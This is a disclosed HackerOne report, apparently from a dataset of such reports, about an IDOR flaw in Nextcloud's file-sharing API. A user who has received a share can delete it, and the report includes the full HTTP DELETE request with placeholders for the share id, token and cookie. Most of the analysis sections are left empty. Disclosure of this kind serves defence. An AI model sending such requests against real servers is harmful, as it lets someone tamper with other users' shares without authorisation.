---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '153905'
original_report_id: '153905'
title: IDOR - Disable sharing
weakness: Privilege Escalation
team_handle: nextcloud
created_at: '2016-07-26T06:21:54.786Z'
disclosed_at: '2016-12-03T21:58:44.569Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- privilege-escalation
---

# IDOR - Disable sharing

## Metadata

- HackerOne Report ID: 153905
- Weakness: Privilege Escalation
- Program: nextcloud
- Disclosed At: 2016-12-03T21:58:44.569Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Decription:
-----
Users are shared files or folder. can disable this sharing.

Detail:
------
 + use request:

DELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1
Host: [your-host]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
requesttoken: [token of user is shared]
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: [cookie of user is shared]
Connection: keep-alive

Note:
----
only user is shared or user in group is shared can do it

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
